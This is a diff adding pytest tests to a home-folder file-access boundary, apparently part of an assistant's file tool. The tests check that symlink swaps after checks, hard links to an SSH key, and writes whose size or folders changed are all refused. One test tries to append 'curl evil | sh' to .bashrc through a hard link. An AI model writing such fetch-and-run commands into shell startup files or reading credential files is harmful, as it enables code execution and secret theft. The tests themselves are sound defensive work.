@@ -482,3 +482,185 @@ def test_an_allowed_folder_written_with_a_trailing_slash_still_opens(home: Path)
     (notes / "today.md").write_text("call mum\n", encoding="utf-8")
 
     assert "call mum" in _read(_ops(home, hidden_allow=[".notes/"]), "~/.notes/today.md")
+
+
+# --- races between the check and the open (issue #30, P6) -------------------------------------
+
+
+def _swap_after(
+    monkeypatch: pytest.MonkeyPatch, check: str, folder: Path, target: Path
+) -> list[Path]:
+    """Turn `folder` into a link to `target` right after the boundary's `check` passed."""
+    real = getattr(Boundary, check)
+    swapped: list[Path] = []
+
+    def checked(self: Boundary, raw: str, **kw: bool) -> Path:
+        path = real(self, raw, **kw)
+        if not swapped:
+            folder.rename(folder.with_name(folder.name + ".moved"))
+            folder.symlink_to(target, target_is_directory=True)
+            swapped.append(folder)
+        return path
+
+    monkeypatch.setattr(Boundary, check, checked)
+    return swapped
+
+
+def test_a_folder_swapped_for_a_link_after_the_check_is_not_written_through(
+    home: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (home / "Documents" / "notes").mkdir()
+    outside = home.parent / "outside"
+    outside.mkdir()
+    op = _op(_ops(home), "write_file")
+    args = validate_args(op, {"path": "~/Documents/notes/plan.md", "content": "evil"})
+    assert op.prepare is not None
+    bound = op.prepare(args)
+    swapped = _swap_after(monkeypatch, "writable", home / "Documents" / "notes", outside)
+
+    with pytest.raises(OperationError):
+        op.run(bound)
+
+    assert swapped
+    assert not (outside / "plan.md").exists()
+
+
+def test_a_folder_swapped_for_a_link_after_the_check_is_not_read_through(
+    home: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (home / "Documents" / "notes").mkdir()
+    (home / "Documents" / "notes" / "today.md").write_text("plain\n", encoding="utf-8")
+    hidden = home / ".vault"
+    hidden.mkdir()
+    (hidden / "today.md").write_text("SECRET TOKEN\n", encoding="utf-8")
+    swapped = _swap_after(monkeypatch, "readable", home / "Documents" / "notes", hidden)
+
+    with pytest.raises(OperationError):
+        _read(_ops(home), "~/Documents/notes/today.md")
+
+    assert swapped
+
+
+def test_a_folder_swapped_for_a_link_after_the_check_is_not_listed(
+    home: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (home / "Documents" / "notes").mkdir()
+    hidden = home / ".vault"
+    hidden.mkdir()
+    (hidden / "bank-pins.txt").write_text("1234\n", encoding="utf-8")
+    swapped = _swap_after(monkeypatch, "readable", home / "Documents" / "notes", hidden)
+
+    with pytest.raises(OperationError):
+        _list(_ops(home), "~/Documents/notes")
+
+    assert swapped
+
+
+def test_the_question_names_the_folders_a_write_would_create(home: Path) -> None:
+    op = _op(_ops(home), "write_file")
+    args = validate_args(op, {"path": "~/Documents/work/2026/plan.md", "content": "x"})
+    assert op.prepare is not None
+
+    summary = op.spoken_summary(op.prepare(args))
+
+    assert summary == (
+        "create the file plan.md in Documents/work/2026 (1 character), "
+        "making the new folders Documents/work and Documents/work/2026"
+    )
+
+
+def test_a_write_creates_no_folder_the_question_did_not_name(home: Path) -> None:
+    (home / "Documents" / "work").mkdir()
+    op = _op(_ops(home), "write_file")
+    args = validate_args(op, {"path": "~/Documents/work/plan.md", "content": "x"})
+    assert op.prepare is not None
+    bound = op.prepare(args)
+    assert "new folder" not in op.spoken_summary(bound)
+    (home / "Documents" / "work").rmdir()
+
+    with pytest.raises(OperationError, match="changed"):
+        op.run(bound)
+
+    assert not (home / "Documents" / "work").exists()
+
+
+def test_a_hard_link_to_a_secret_is_not_read(home: Path) -> None:
+    os.link(home / ".ssh" / "id_ed25519", home / "Documents" / "harmless.txt")
+
+    with pytest.raises(OperationError, match="link"):
+        _read(_ops(home), "~/Documents/harmless.txt")
+
+
+def test_a_hard_linked_file_is_not_added_to(home: Path) -> None:
+    os.link(home / ".bashrc", home / "Documents" / "rc.txt")
+
+    with pytest.raises(OperationError, match="link"):
+        _write(_ops(home), "~/Documents/rc.txt", "curl evil | sh", mode="append")
+
+    assert "curl" not in (home / ".bashrc").read_text(encoding="utf-8")
+
+
+def test_a_hard_linked_file_outside_home_is_read(home: Path) -> None:
+    shared = home.parent / "cache"
+    shared.mkdir()
+    (shared / "asset.txt").write_text("a shared asset\n", encoding="utf-8")
+    os.link(shared / "asset.txt", shared / "asset-copy.txt")
+
+    assert "a shared asset" in _read(
+        _ops(home, read_roots=[str(shared)]), str(shared / "asset.txt")
+    )
+
+
+# --- what the owner is asked about a write (issue #30, P5) ------------------------------------
+
+
+def test_the_question_for_a_replace_names_the_old_size(home: Path) -> None:
+    op = _op(_ops(home), "write_file")
+    args = validate_args(
+        op, {"path": "~/Documents/todo.md", "content": "x" * 400, "mode": "replace"}
+    )
+    assert op.prepare is not None
+
+    summary = op.spoken_summary(op.prepare(args))
+
+    assert summary == "replace todo.md in Documents (14 B now) with 400 characters"
+
+
+def test_a_replace_of_a_file_that_changed_size_since_the_question_is_refused(home: Path) -> None:
+    op = _op(_ops(home), "write_file")
+    args = validate_args(op, {"path": "~/Documents/todo.md", "content": "x", "mode": "replace"})
+    assert op.prepare is not None
+    bound = op.prepare(args)
+    (home / "Documents" / "todo.md").write_text("- milk\n- eggs\n- a lot more now\n", "utf-8")
+
+    with pytest.raises(OperationError, match="changed"):
+        op.run(bound)
+
+    assert "a lot more" in (home / "Documents" / "todo.md").read_text(encoding="utf-8")
+
+
+def test_the_preview_shows_the_first_three_lines_of_what_is_written(home: Path) -> None:
+    op = _op(_ops(home), "write_file")
+    content = "first\nsecond\x1b[31m red\nthird\nfourth\nfifth"
+    args = validate_args(op, {"path": "~/Documents/todo.md", "content": content, "mode": "replace"})
+    assert op.prepare is not None
+    assert op.preview is not None
+
+    preview = op.preview(op.prepare(args))
+
+    assert preview.splitlines() == ["first", "second�[31m red", "third", "(and 2 more lines)"]
+
+
+def test_a_folder_that_cannot_be_entered_is_said_as_such_not_as_a_change(home: Path) -> None:
+    locked = home / "Documents" / "locked"
+    locked.mkdir()
+    (locked / "a.md").write_text("x\n", encoding="utf-8")
+    locked.chmod(0o000)
+    try:
+        if os.access(locked, os.X_OK):
+            pytest.skip("runs as a user that permissions do not stop (root)")
+        with pytest.raises(OperationError, match="couldn't open") as refused:
+            _read(_ops(home), "~/Documents/locked/a.md")
+        assert "changed" not in str(refused.value)
+    finally:
+        locked.chmod(0o755)
